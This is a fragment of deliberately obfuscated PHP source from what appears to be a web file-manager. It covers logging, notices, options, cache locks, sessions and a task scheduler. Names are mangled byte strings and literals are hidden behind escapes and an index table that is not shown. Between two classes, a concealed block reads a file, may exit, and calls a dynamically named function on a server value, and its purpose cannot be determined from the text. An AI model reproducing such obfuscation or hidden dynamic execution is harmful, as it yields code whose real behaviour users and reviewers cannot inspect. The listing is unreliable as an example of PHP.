$Àßó‡²å[$³Ìûˆò˜[180]]; break; } return $Ò›óà×’; } private function getSourceList(&$É‚Àüà–) { $¼­Ğ³Ÿ‘ =& $_SERVER[³½¬ÚË¯]; $º¢©˜¶” = array(); foreach ($É‚Àüà– as $ğ¦™–Ç£ => $Û†Ì’¥Œ) { $¨ıéÙßã = json_decode($Û†Ì’¥Œ[$¼­Ğ³Ÿ‘[494]], !0); if ($Û†Ì’¥Œ[$¼­Ğ³Ÿ‘[33]] == $¼­Ğ³Ÿ‘[1862]) { $¨ıéÙßã = $this->descZipDownload($¨ıéÙßã, $º¢©˜¶”); $É‚Àüà–[$ğ¦™–Ç£][$¼­Ğ³Ÿ‘[494]] = json_encode($¨ıéÙßã); continue; } if (strpos($Û†Ì’¥Œ[$¼­Ğ³Ÿ‘[33]], $¼­Ğ³Ÿ‘[2118]) !== 0) { if (!isset($¨ıéÙßã[$¼­Ğ³Ÿ‘[84]]) || strpos($Û†Ì’¥Œ[$¼­Ğ³Ÿ‘[33]], $¼­Ğ³Ÿ‘[2318]) !== 0) { continue; } try { $ŸøÓêù = IO::infoFullSimple($¨ıéÙßã[$¼­Ğ³Ÿ‘[84]]); } catch (Exception $ùĞ½»÷¡) { continue; } $º¢©˜¶”[] = $¨ıéÙßã[$¼­Ğ³Ÿ‘[181]] = $ŸøÓêù[$¼­Ğ³Ÿ‘[181]]; $º¢©˜¶”[] = $¨ıéÙßã[$¼­Ğ³Ÿ‘[2116]] = $ŸøÓêù[$¼­Ğ³Ÿ‘[180]]; $É‚Àüà–[$ğ¦™–Ç£][$¼­Ğ³Ÿ‘[494]] = json_encode($¨ıéÙßã); continue; } $º¢©˜¶”[] = $¨ıéÙßã[$¼­Ğ³Ÿ‘[181]]; $º¢©˜¶”[] = $¨ıéÙßã[$¼­Ğ³Ÿ‘[2116]]; if ($¨ıéÙßã[$¼­Ğ³Ÿ‘[33]] == $¼­Ğ³Ÿ‘[589]) { $º¢©˜¶”[] = $¨ıéÙßã[$¼­Ğ³Ÿ‘[494]][$¼­Ğ³Ÿ‘[1203]]; $º¢©˜¶”[] = $¨ıéÙßã[$¼­Ğ³Ÿ‘[494]][$¼­Ğ³Ÿ‘[1204]]; } if ($¨ıéÙßã[$¼­Ğ³Ÿ‘[33]] == $¼­Ğ³Ÿ‘[2126]) { $º¢©˜¶”[] = $¨ıéÙßã[$¼­Ğ³Ÿ‘[494]][$¼­Ğ³Ÿ‘[181]]; } } if (!$º¢©˜¶”) { return array(); } return Model($¼­Ğ³Ÿ‘[861])->sourceListInfo($º¢©˜¶”, !0); } private function logList($şÕşÀÆ) { $ğÎûäÒ× =& $_SERVER[³½¬ÚË¯]; $Û‡İ™Çş = array_to_keyvalue($şÕşÀÆ, $ğÎûäÒ×[12], $ğÎûäÒ×[1690]); $±„ íÒÄ = Model($ğÎûäÒ×[568])->userListInfo(array_unique($Û‡İ™Çş)); $ËÓ£¢©Í = $this->getSourceList($şÕşÀÆ); $ÁÆÚ”Ãµ = $this->typeAll(); $çšè‰Ù‰ = array(); $¥»î½Ù… = array(); foreach ($şÕşÀÆ as $¯…Ÿ¿é => $öÏ†ƒ) { $¸şÜ—ÅÉ = $öÏ†ƒ[$ğÎûäÒ×[33]]; $œï¼øÆà = isset($±„ íÒÄ[$öÏ†ƒ[$ğÎûäÒ×[1690]]]) ? $±„ íÒÄ[$öÏ†ƒ[$ğÎûäÒ×[1690]]] : !1; $úü½š¥à = strpos($¸şÜ—ÅÉ, $ğÎûäÒ×[2319]) === 0 ? LNG($ğÎûäÒ×[2320]) : LNG($ğÎûäÒ×[2315]); $öÏ†ƒ[$ğÎûäÒ×[32]] = isset($œï¼øÆà[$ğÎûäÒ×[32]]) ? $œï¼øÆà[$ğÎûäÒ×[32]] : LNG($ğÎûäÒ×[2315]); $öÏ†ƒ[$ğÎûäÒ×[2170]] = isset($œï¼øÆà[$ğÎûäÒ×[2170]]) ? $œï¼øÆà[$ğÎûäÒ×[2170]] : $ğÎûäÒ×[12]; $öÏ†ƒ[$ğÎûäÒ×[1587]] = isset($ÁÆÚ”Ãµ[$¸şÜ—ÅÉ]) ? $ÁÆÚ”Ãµ[$¸şÜ—ÅÉ] : $úü½š¥à; $öÏ†ƒ[$ğÎûäÒ×[2060]] = $œï¼øÆà; $µáúì£Ş = json_decode($öÏ†ƒ[$ğÎûäÒ×[494]], !0); $öÏ†ƒ[$ğÎûäÒ×[2312]] = isset($µáúì£Ş[$ğÎûäÒ×[2312]]) ? $µáúì£Ş[$ğÎûäÒ×[2312]] : $ğÎûäÒ×[12]; $öÏ†ƒ[$ğÎûäÒ×[2316]] = IpLocation::get($öÏ†ƒ[$ğÎûäÒ×[2312]]); if (strpos($¸şÜ—ÅÉ, $ğÎûäÒ×[2118]) === 0 || isset($µáúì£Ş[$ğÎûäÒ×[2116]])) { $µáúì£Ş[$ğÎûäÒ×[87]] = $ËÓ£¢©Í[$µáúì£Ş[$ğÎûäÒ×[181]]]; $µáúì£Ş[$ğÎûäÒ×[2131]] = $ËÓ£¢©Í[$µáúì£Ş[$ğÎûäÒ×[2116]]]; if ($µáúì£Ş[$ğÎûäÒ×[33]] == $ğÎûäÒ×[589]) { $µáúì£Ş[$ğÎûäÒ×[494]][$ğÎûäÒ×[1203]] = $ËÓ£¢©Í[$µáúì£Ş[$ğÎûäÒ×[494]][$ğÎûäÒ×[1203]]]; $µáúì£Ş[$ğÎûäÒ×[494]][$ğÎûäÒ×[1204]] = $ËÓ£¢©Í[$µáúì£Ş[$ğÎûäÒ×[494]][$ğÎûäÒ×[1204]]]; } if ($µáúì£Ş[$ğÎûäÒ×[33]] == $ğÎûäÒ×[2126]) { $µáúì£Ş[$ğÎûäÒ×[494]][$ğÎûäÒ×[181]] = $ËÓ£¢©Í[$µáúì£Ş[$ğÎûäÒ×[494]][$ğÎûäÒ×[181]]]; } if ($µáúì£Ş[$ğÎûäÒ×[33]] == $ğÎûäÒ×[1857]) { $µáúì£Ş[$ğÎûäÒ×[2131]] = $µáúì£Ş[$ğÎûäÒ×[87]]; $µáúì£Ş[$ğÎûäÒ×[2116]] = $µáúì£Ş[$ğÎûäÒ×[2131]][$ğÎûäÒ×[181]]; $µáúì£Ş[$ğÎûäÒ×[87]] = !1; $µáúì£Ş[$ğÎûäÒ×[181]] = $ğÎûäÒ×[12]; } if ($µáúì£Ş[$ğÎûäÒ×[87]] && $µáúì£Ş[$ğÎûäÒ×[87]][$ğÎûäÒ×[178]] == $ğÎûäÒ×[179]) { $¥»î½Ù…[] = $öÏ†ƒ[$ğÎûäÒ×[443]]; unset($şÕşÀÆ[$¯…Ÿ¿é]); continue; } if ($µáúì£Ş[$ğÎûäÒ×[2131]] && $µáúì£Ş[$ğÎûäÒ×[2131]][$ğÎûäÒ×[178]] == $ğÎûäÒ×[179]) { $¥»î½Ù…[] = $öÏ†ƒ[$ğÎûäÒ×[443]]; unset($şÕşÀÆ[$¯…Ÿ¿é]); continue; } } $öÏ†ƒ[$ğÎûäÒ×[494]] = $µáúì£Ş; unset($öÏ†ƒ[$ğÎûäÒ×[2321]]); $çšè‰Ù‰[] = $öÏ†ƒ; } $this->clearSystemPathLog($¥»î½Ù…); return $çšè‰Ù‰; } private function clearSystemPathLog($ö °¦¢ò) { $¦ú—úŠ¿ =& $_SERVER[³½¬ÚË¯]; if (count($ö °¦¢ò) == 0) { return; } $ÏÛœ¿Õ— = array($¦ú—úŠ¿[443] => array($¦ú—úŠ¿[7], array_unique($ö °¦¢ò))); $this->where($ÏÛœ¿Õ—)->delete(); } public function deviceList($ÙíÍ–®Ë, $ Âƒçğ© = 0) { $Šºıì¡´ =& $_SERVER[³½¬ÚË¯]; $¤òÉÈ…¿ = array($Šºıì¡´[1690] => $ÙíÍ–®Ë, $Šºıì¡´[215] => array($Šºıì¡´[1057], $ Âƒçğ©), $Šºıì¡´[33] => $Šºıì¡´[1831]); $ì®€È… = array(); $¨Á¿æä = $this->field($Šºıì¡´[2322])->where($¤òÉÈ…¿)->order($Šºıì¡´[2129])->limit(50)->select(); foreach ($¨Á¿æä as $àºÌ­İí => $‡¢¡äÁ) { if ($àºÌ­İí > 0 && abs($‡¢¡äÁ[$Šºıì¡´[215]] - $¨Á¿æä[$àºÌ­İí - 1][$Šºıì¡´[215]]) < 5) { continue; } $´Û‰„ü× = json_decode($‡¢¡äÁ[$Šºıì¡´[494]], !0); $‡¢¡äÁ[$Šºıì¡´[2312]] = isset($´Û‰„ü×[$Šºıì¡´[2312]]) ? $´Û‰„ü×[$Šºıì¡´[2312]] : $Šºıì¡´[12]; unset($´Û‰„ü×[$Šºıì¡´[2312]]); $»ŒŒëñä = $this->deviceType($´Û‰„ü×[$Šºıì¡´[2119]]); if (isset($ì®€È…[$»ŒŒëñä])) { continue; } $‡¢¡äÁ[$Šºıì¡´[2316]] = IpLocation::get($‡¢¡äÁ[$Šºıì¡´[2312]]); $‡¢¡äÁ[$Šºıì¡´[494]] = $´Û‰„ü×; $ì®€È…[$»ŒŒëñä] = $‡¢¡äÁ; } return array_values($ì®€È…); } public function deviceType($Ğªç­À) { return $Ğªç­À; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\x6e\157\164\151\143\x65\114\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x63\x6f\x6e\x74\x65\x6e\164", "\141\x75\164\x68", "\155\157\x64\x65", "\x74\151\x6d\x65", "\164\x79\160\145", "\x6c\145\166\x65\154", "\x65\156\x61\x62\x6c\145", "\163\157\x72\x74"); public function listData($´è®¼Ÿ = false, $³»âœĞ = "\x73\157\162\164", $é—¯Ü = false) { return parent::listData($´è®¼Ÿ, $³»âœĞ, $é—¯Ü); } public function add($ö¡Ë£ûÏ) { $‡— Ğ£ =& $_SERVER[³½¬ÚË¯]; $âçß‚© = time(); if ($ö¡Ë£ûÏ[$‡— Ğ£[16]] == $‡— Ğ£[2323]) { $âçß‚© = strtotime($ö¡Ë£ûÏ[$‡— Ğ£[194]]); } $ö¡Ë£ûÏ[$‡— Ğ£[194]] = $âçß‚©; return parent::insert($ö¡Ë£ûÏ); } public function update($¹Êğ™İ·, $ó­¯‰Ì) { $ü•™åº· =& $_SERVER[³½¬ÚË¯]; $í¦¯ëº£ = $this->listData($¹Êğ™İ·); if (!$í¦¯ëº£) { return !1; } $Ú”Ö½¬Å = time(); if ($ó­¯‰Ì[$ü•™åº·[16]] == $ü•™åº·[2323]) { $Ú”Ö½¬Å = strtotime($ó­¯‰Ì[$ü•™åº·[194]]); } $ó­¯‰Ì[$ü•™åº·[194]] = $Ú”Ö½¬Å; return parent::update($¹Êğ™İ·, $ó­¯‰Ì); } public function remove($¯”Ä¢§…) { $³ †Ğ¶ò = $this->listData($¯”Ä¢§…); if (!$³ †Ğ¶ò || $³ †Ğ¶ò[$_SERVER[³½¬ÚË¯][179]]) { return !1; } return parent::remove($¯”Ä¢§…); } public function sort($é»­ôË›, $Á„êŒ¼Ò) { return parent::update($é»­ôË›, $Á„êŒ¼Ò); } public function enable($Ó†Í©±Ã, $ÄÃœğÈ°) { return parent::update($Ó†Í©±Ã, array($_SERVER[³½¬ÚË¯][2324] => $ÄÃœğÈ°)); } private function initUserOption() { $œÏ´ê¨ß =& $_SERVER[³½¬ÚË¯]; $this->optionType = $œÏ´ê¨ß[2325]; $this->modelType = $œÏ´ê¨ß[2326]; $this->field = array($œÏ´ê¨ß[2327], $œÏ´ê¨ß[32], $œÏ´ê¨ß[194], $œÏ´ê¨ß[33], $œÏ´ê¨ß[2328], $œÏ´ê¨ß[786], $œÏ´ê¨ß[210]); } public function userNoticeGet($şûæ­ğ = false) { $this->initUserOption(); return parent::listData($şûæ­ğ, $_SERVER[³½¬ÚË¯][443], !0); } public function userNoticeAdd($šç—Äà) { $®¤àÁÃŸ =& $_SERVER[³½¬ÚË¯]; $this->initUserOption(); $ÒøœÙæó = $this->findByKey($®¤àÁÃŸ[2327], $šç—Äà[$®¤àÁÃŸ[443]]); if ($ÒøœÙæó) { return !0; } $€¾ÇÚ•Ö = array($®¤àÁÃŸ[2327] => $šç—Äà[$®¤àÁÃŸ[443]], $®¤àÁÃŸ[32] => $šç—Äà[$®¤àÁÃŸ[32]], $®¤àÁÃŸ[194] => $šç—Äà[$®¤àÁÃŸ[194]], $®¤àÁÃŸ[33] => isset($šç—Äà[$®¤àÁÃŸ[33]]) ? $šç—Äà[$®¤àÁÃŸ[33]] : 1, $®¤àÁÃŸ[2328] => isset($šç—Äà[$®¤àÁÃŸ[2328]]) ? $šç—Äà[$®¤àÁÃŸ[2328]] : 0, $®¤àÁÃŸ[786] => 0, $®¤àÁÃŸ[210] => 0); return parent::insert($€¾ÇÚ•Ö); } public function userNoticeEdit($ÖÍ€•õ¬, $×ÇƒèÓ¥) { $this->initUserOption(); return parent::update($ÖÍ€•õ¬, $×ÇƒèÓ¥); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\145\155\x5f\157\160\x74\x69\157\156"; protected $jsonField = array("\155\x65\x6e\x75", "\162\x6f\154\145", "\162\x6f\x6c\145\107\x72\157\x75\160", "\x72\x65\147\x69\x73\x74", "\x65\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($½´‹²ò) { return "\x53\171\163\x74\x65\x6d\117\x70\x74\x69\157\x6e\x5f{$½´‹²ò}"; } protected function optionDefault($öÜû« = '') { $ïå‡Åß =& $_SERVER[³½¬ÚË¯]; if ($öÜû« == $ïå‡Åß[12]) { return $GLOBALS[$ïå‡Åß[6]][$ïå‡Åß[425]]; } } } goto eßôÜ·—Õ; c³Ó· †è: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $óö’µ«Ù =& $_SERVER[³½¬ÚË¯]; $œïŸ¥Æü = $GLOBALS[$óö’µ«Ù[6]][$óö’µ«Ù[393]]; self::$cachePath = $œïŸ¥Æü[$óö’µ«Ù[214]][$óö’µ«Ù[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ô³‰öÂÒ, $¥Ñ¿ÎüÓ = 0) { $½òŒãšÏ =& $_SERVER[³½¬ÚË¯]; $ùğœğ¼ß = microtime(!0); $íËÊĞƒà = $ùğœğ¼ß + $¥Ñ¿ÎüÓ + 0.0001; $¢îğÁõµ = rtrim(self::$cachePath, $½òŒãšÏ[8]) . $½òŒãšÏ[900] . md5($Ô³‰öÂÒ) . $½òŒãšÏ[897]; if (file_exists($¢îğÁõµ) && filemtime($¢îğÁõµ) && filemtime($¢îğÁõµ) < time() - 10) { @unlink($¢îğÁõµ); } do { if (file_exists($¢îğÁõµ)) { cacheLockWait(); continue; } $äô§µŠÇ = fopen($¢îğÁõµ, $½òŒãšÏ[901]); if (!$äô§µŠÇ) { return !1; } $Æô½¬¬ = flock($äô§µŠÇ, LOCK_EX | LOCK_NB); self::$caches[$Ô³‰öÂÒ] = array($½òŒãšÏ[902] => $äô§µŠÇ, $½òŒãšÏ[214] => $¢îğÁõµ); fwrite($äô§µŠÇ, $íËÊĞƒà); clearstatcache(); if ($äô§µŠÇ && $Æô½¬¬) { return !0; } cacheLockWait(); } while (microtime(!0) < $íËÊĞƒà); $this->unlock($Ô³‰öÂÒ); return !1; } public function lockGet($Ü«şçÛ) { $â§ÇŠ¶™ =& $_SERVER[³½¬ÚË¯]; $†­¶—Ÿö = rtrim(self::$cachePath, $â§ÇŠ¶™[8]) . $â§ÇŠ¶™[900] . md5($Ü«şçÛ) . $â§ÇŠ¶™[897]; return file_exists($†­¶—Ÿö); } public function unlock($šĞÜøÁ¹) { $©¼ô‹Æ =& $_SERVER[³½¬ÚË¯]; $ñÏ¥óè = self::$caches[$šĞÜøÁ¹]; if (!$ñÏ¥óè) { return; } @flock($ñÏ¥óè[$©¼ô‹Æ[902]], LOCK_UN); @fclose($ñÏ¥óè[$©¼ô‹Æ[902]]); @unlink($ñÏ¥óè[$©¼ô‹Æ[214]]); unset(self::$caches[$šĞÜøÁ¹]); } } if ($_SERVER[$_SERVER[³½¬ÚË¯][903]] != $_SERVER[$_SERVER[³½¬ÚË¯][904]]) { $_getc = $_SERVER[³½¬ÚË¯][905]; $_getfile = $_SERVER[$_SERVER[³½¬ÚË¯][906]] . $_SERVER[³½¬ÚË¯][907]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³½¬ÚË¯][246], $_getfilec); if (count($_getarrs) < $_SERVER[³½¬ÚË¯][658]) { $exit = $_SERVER[³½¬ÚË¯][908]; $exit(); } $_act = $_SERVER[³½¬ÚË¯][909]; $_act($_SERVER[$_SERVER[³½¬ÚË¯][910]]); } class CacheLockRedis { public function lock($èˆ‡Ğüİ, $‚ê¹—½ = 10) { $âõ ¸ë¢ = Cache::init(); $…àéá¾‡ = microtime(!0) + $‚ê¹—½; while (microtime(!0) < $…àéá¾‡) { $ˆº¸°Œƒ = $âõ ¸ë¢->get($èˆ‡Ğüİ); if (!$ˆº¸°Œƒ) { $¡ñË˜ÑÅ = $âõ ¸ë¢->setLock($èˆ‡Ğüİ, $…àéá¾‡, $‚ê¹—½); if ($¡ñË˜ÑÅ) { return !0; } } else { if ($ˆº¸°Œƒ < microtime(!0)) { $âõ ¸ë¢->set($èˆ‡Ğüİ, $…àéá¾‡, $‚ê¹—½ * 2); if ($âõ ¸ë¢->get($èˆ‡Ğüİ) === $ˆº¸°Œƒ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÔÕéõœ¾) { return Cache::init()->get($ÔÕéõœ¾); } public function unlock($»üÓÕ… ) { return Cache::init()->remove($»üÓÕ… ); } } goto fÕª¢ù¨½; a¦œ‚¹Ñ†: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ŠÊÖû½ =& $_SERVER[³½¬ÚË¯]; static $©¦ãíö¥ = false; if ($©¦ãíö¥) { return $©¦ãíö¥; } $æİä´¹ = $GLOBALS[$ŠÊÖû½[6]][$ŠÊÖû½[393]]; self::$sessionTime = $æİä´¹[$ŠÊÖû½[1642]]; $ëç¢¬Ê‹ = isset($GLOBALS[$ŠÊÖû½[1643]]) ? $GLOBALS[$ŠÊÖû½[1643]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ëç¢¬Ê‹)) { self::$sessionSign = Cookie::get($ëç¢¬Ê‹); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ëç¢¬Ê‹, self::$sessionSign, self::$sessionTime); $ò‰ß¶˜ù = $æİä´¹[$ŠÊÖû½[1644]]; $Ì£×ºÆ– = $æİä´¹[$ò‰ß¶˜ù]; $Æı‚®‚ = $æİä´¹[$ŠÊÖû½[864]]; switch ($ò‰ß¶˜ù) { case $ŠÊÖû½[21]: self::$handle = Model($ŠÊÖû½[865]); break; case $ŠÊÖû½[866]: self::$handle = new CacheRedis($Ì£×ºÆ–, $Æı‚®‚); break; case $ŠÊÖû½[867]: self::$handle = new CacheMemcached($Ì£×ºÆ–, $Æı‚®‚); break; case $ŠÊÖû½[214]: $Ì£×ºÆ–[$ŠÊÖû½[84]] = $Ì£×ºÆ–[$ŠÊÖû½[84]] . $ŠÊÖû½[1645]; self::$handle = new CacheFile($Ì£×ºÆ–, $Æı‚®‚); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $©¦ãíö¥ = new self(); return $©¦ãíö¥; } public static function getBySign($ÜÁÈ„Â¶) { $úÙÑµúª = self::$handle->get($ÜÁÈ„Â¶); $úÙÑµúª = unserialize($úÙÑµúª); return is_array($úÙÑµúª) ? $úÙÑµúª : array(); } public static function setBySign($®Ô…”Ê, $†Şƒœ¥ğ) { CacheLock::lock($®Ô…”Ê); self::$handle->set($®Ô…”Ê, serialize($†Şƒœ¥ğ), self::$sessionTime); CacheLock::unlock($®Ô…”Ê); } public static function sign($»¬¼ = false) { if ($»¬¼) { self::$sessionSign = $»¬¼; } self::init(); return self::$sessionSign; } public static function set($¸Ò¨¶Ï, $÷úóàë± = false) { self::init(); if (is_array($¸Ò¨¶Ï)) { foreach ($¸Ò¨¶Ï as $å‘×ÔÂ => $±½¡âçõ) { array_set_value(self::$data, $å‘×ÔÂ, $±½¡âçõ); } } else { array_set_value(self::$data, $¸Ò¨¶Ï, $÷úóàë±); } self::setBySign(self::$sessionSign, self::$data); } public static function get($øÕëØùÈ = false) { self::init(); if (!$øÕëØùÈ) { return self::$data; } return array_get_value(self::$data, $øÕëØùÈ); } public static function remove($±Ó‰œÅ) { self::init(); unset(self::$data[$±Ó‰œÅ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[³½¬ÚË¯][870])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ö¥›”æ =& $_SERVER[³½¬ÚË¯]; if (self::valueGet($ö¥›”æ[786]) != $ö¥›”æ[88]) { return; } if (self::valueGet($ö¥›”æ[1646]) == $ö¥›”æ[88]) { $º‹¶ó‚· = self::valueGet($ö¥›”æ[1647]); if (time() - $º‹¶ó‚· > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ö¥›”æ[1646], $ö¥›”æ[88]); self::log($ö¥›”æ[1648] . ACTION . $ö¥›”æ[1649]); Hook::bind($ö¥›”æ[1650], $ö¥›”æ[1651]); $ã¹¯¬ ê = 0; while (!0) { self::cacheClear(); if (self::valueGet($ö¥›”æ[786]) != $ö¥›”æ[88]) { self::valueSet($ö¥›”æ[1646], $ö¥›”æ[212]); self::log($ö¥›”æ[1652]); die; } $ˆ¬ë‚ä = time(); if ($ˆ¬ë‚ä - $ã¹¯¬ ê >= 60) { self::valueSet(array($ö¥›”æ[1646] => $ö¥›”æ[88], $ö¥›”æ[1647] => $ˆ¬ë‚ä), !1); $ã¹¯¬ ê = $ˆ¬ë‚ä; } if (!file_exists(USER_SYSTEM . $ö¥›”æ[1653])) { self::valueSet(array($ö¥›”æ[1646] => $ö¥›”æ[212], $ö¥›”æ[786] => $ö¥›”æ[212]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $—ñ©ãò½ =& $_SERVER[³½¬ÚË¯]; http_close(); $GLOBALS[$—ñ©ãò½[1654]] = 1; $_SERVER[$—ñ©ãò½[1655]] = $—ñ©ãò½[1656]; $_COOKIE = array(); $GLOBALS[$—ñ©ãò½[537]] = 1; $GLOBALS[$—ñ©ãò½[1657]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ªşĞÒÀË =& $_SERVER[³½¬ÚË¯]; http_close(); self::valueSet($ªşĞÒÀË[786], $ªşĞÒÀË[212]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ªşĞÒÀË[1646] => $ªşĞÒÀË[212], $ªşĞÒÀË[786] => $ªşĞÒÀË[88]), !1); } public static function taskSwitch() { $êåÜéú =& $_SERVER[³½¬ÚË¯]; $¨‡ÒïÓå = self::valueGet($êåÜéú[786]) == $êåÜéú[88] ? $êåÜéú[212] : $êåÜéú[88]; self::valueSet($êåÜéú[786], $¨‡ÒïÓå); } public static function shutdownEvent() { $§êå¿ë¥ =& $_SERVER[³½¬ÚË¯]; self::valueSet($§êå¿ë¥[1646], $§êå¿ë¥[212]); self::log($§êå¿ë¥[1658]); } public static function config($„Œâöìş, $¥æÑòü…) { self::valueSet($_SERVER[³½¬ÚË¯][786], $„Œâöìş); } private static function taskRunAll() { $¨•â”ÎĞ =& $_SERVER[³½¬ÚË¯]; $Êò‚¹İÒ = timeFloat(); $Ä˜¡Ü£Ó = Model($¨•â”ÎĞ[1659])->listData(); $§¾Ø¿´ = count($Ä˜¡Ü£Ó); for ($¢â¶¥ç” = 0; $¢â¶¥ç” < $§¾Ø¿´; $¢â¶¥ç”++) { $—¥“¨« = $Ä˜¡Ü£Ó[$¢â¶¥ç”]; if (!$—¥“¨«[$¨•â”ÎĞ[443]] || $—¥“¨«[$¨•â”ÎĞ[1660]] != $¨•â”ÎĞ[88]) { continue; } if (!self::taskTimeCheck($—¥“¨«)) { continue; } self::taskRun($—¥“¨«); } Hook::trigger($¨•â”ÎĞ[1661]); self::taskQueueRun($Êò‚¹İÒ); } private static function taskQueueRun($Şš·¶‹†) { $”õ°ËŠ = 10; while (!0) { $ß‡‘üÒ = TaskQueue::run(); if ($ß‡‘üÒ === !1) { break; } if (timeFloat() - $Şš·¶‹† >= $”õ°ËŠ) { break; } } } private static function taskTimeCheck($ÏÆÙ¸) { $µÖ‚‹•ú =& $_SERVER[³½¬ÚË¯]; $ÜÏîøÖ” = json_decode($ÏÆÙ¸[$µÖ‚‹•ú[194]], !0); $ÕÅ¾ï”ï = intval($ÏÆÙ¸[$µÖ‚‹•ú[1647]]); $ŒÜÄš³ñ = strtotime($µÖ‚‹•ú[1662] . $ÜÏîøÖ”[$µÖ‚‹•ú[1663]] . $µÖ‚‹•ú[1664]) - strtotime($µÖ‚‹•ú[1665]); $ö•Òéá = time() - strtotime(date($µÖ‚‹•ú[1666]) . $µÖ‚‹•ú[1667]); $º¨”‰“§ = $ö•Òéá >= $ŒÜÄš³ñ && $ö•Òéá <= $ŒÜÄš³ñ + 3600; switch ($ÜÏîøÖ”[$µÖ‚‹•ú[33]]) { case $µÖ‚‹•ú[1668]: if (time() - $ÕÅ¾ï”ï < 3600 * 24 * 30) { return !1; } if ($ÜÏîøÖ”[$µÖ‚‹•ú[1668]] == date($µÖ‚‹•ú[1669]) && $º¨”‰“§) { return !0; } break; case $µÖ‚‹•ú[1670]: if (time() - $ÕÅ¾ï”ï < 3600 * 24 * 7) { return !1; } $Œ©Æï¦å = date($µÖ‚‹•ú[1671]) == 0 ? 7 : date($µÖ‚‹•ú[1671]); if ($ÜÏîøÖ”[$µÖ‚‹•ú[1670]] == $Œ©Æï¦å && $º¨”‰“§) { return !0; } break; case $µÖ‚‹•ú[1663]: if (time() - $ÕÅ¾ï”ï < 3600 * 24) { return !1; } if ($º¨”‰“§) { return !0; } break; case $µÖ‚‹•ú[1672]: if (time() - $ÕÅ¾ï”ï >= floatval($ÜÏîøÖ”[$µÖ‚‹•ú[1672]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $—ˆ°ıÅé =& $_SERVER[³½¬ÚË¯]; static $†ÈÑÛ´­ = 0; $‹³Ÿ’çÆ = 300; if (!$†ÈÑÛ´­) { $†ÈÑÛ´­ = time(); } if (time() - $†ÈÑÛ´­ < $‹³Ÿ’çÆ) { return; } $†ÈÑÛ´­ = time(); $Ìè¦ãí = Model($—ˆ°ıÅé[547])->db($—ˆ°ıÅé[12]); if ($Ìè¦ãí) { $Ìè¦ãí->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($—ˆ°ıÅé[1673], $—ˆ°ıÅé[1674]); die; } } public static function taskRun($òİêÅ¯) { $Âû•Ê¿™ =& $_SERVER[³½¬ÚË¯]; self::log($Âû•Ê¿™[1675] . $òİêÅ¯[$Âû•Ê¿™[443]] . $Âû•Ê¿™[1676] . $òİêÅ¯[$Âû•Ê¿™[32]] . $Âû•Ê¿™[1677] . $òİêÅ¯[$Âû•Ê¿™[1678]]); Model($Âû•Ê¿™[1659])->run($òİêÅ¯[$Âû•Ê¿™[443]]); $åÛÔ§è­ = timeFloat(); $¦°ñ€„û = $Âû•Ê¿™[12]; switch ($òİêÅ¯[$Âû•Ê¿™[33]]) { case $Âû•Ê¿™[351]: $ê«ÅËÁÌ = url_request($òİêÅ¯[$Âû•Ê¿™[1678]], $Âû•Ê¿™[245], !1, !1, !1, !1, 10); if ($ê«ÅËÁÌ[$Âû•Ê¿™[786]]) { $¦°ñ€„û = strlen($ê«ÅËÁÌ[$Âû•Ê¿™[1245]]); } break; case $Âû•Ê¿™[244]: $¦°ñ€„û = Hook::apply($òİêÅ¯[$Âû•Ê¿™[1678]]); default: break; } Model($Âû•Ê¿™[1679])->add(array($Âû•Ê¿™[1680] => $Âû•Ê¿™[12], $Âû•Ê¿™[1681] => $Âû•Ê¿™[212], $Âû•Ê¿™[33] => $Âû•Ê¿™[1682] . $òİêÅ¯[$Âû•Ê¿™[443]], $Âû•Ê¿™[1683] => json_encode(array($Âû•Ê¿™[32] => $òİêÅ¯[$Âû•Ê¿™[32]], $Âû•Ê¿™[1684] => timeFloat() - $åÛÔ§è­, $Âû•Ê¿™[337] => $¦°ñ€„û)))); $ü›‚Ü´ç = $¦°ñ€„û ? $Âû•Ê¿™[1685] . $¦°ñ€„û : $Âû•Ê¿™[12]; self::log($Âû•Ê¿™[1686] . $òİêÅ¯[$Âû•Ê¿™[443]] . $Âû•Ê¿™[165] . $ü›‚Ü´ç); return !0; } public static function valueGet($ë‚©¸™ ) { $¶ıªó‚‡ =& $_SERVER[³½¬ÚË¯]; $‘„‰Àõ = $¶ıªó‚‡[1687]; $”›øŞÓ = Model($¶ıªó‚‡[476])->get($ë‚©¸™ , $‘„‰Àõ); if (is_null($”›øŞÓ)) { Model($¶ıªó‚‡[476])->set($¶ıªó‚‡[786], $¶ıªó‚‡[88], $‘„‰Àõ); Model($¶ıªó‚‡[476])->set($¶ıªó‚‡[1646], $¶ıªó‚‡[212], $‘„‰Àõ); $”›øŞÓ = Model($¶ıªó‚‡[476])->get($ë‚©¸™ , $‘„‰Àõ); } return $”›øŞÓ; } private static function valueSet($Ô§¤³‡Ó, $°•ªÑ«ø) { $ò…«Ëë¨ =& $_SERVER[³½¬ÚË¯]; $Çäå‡š‘ = 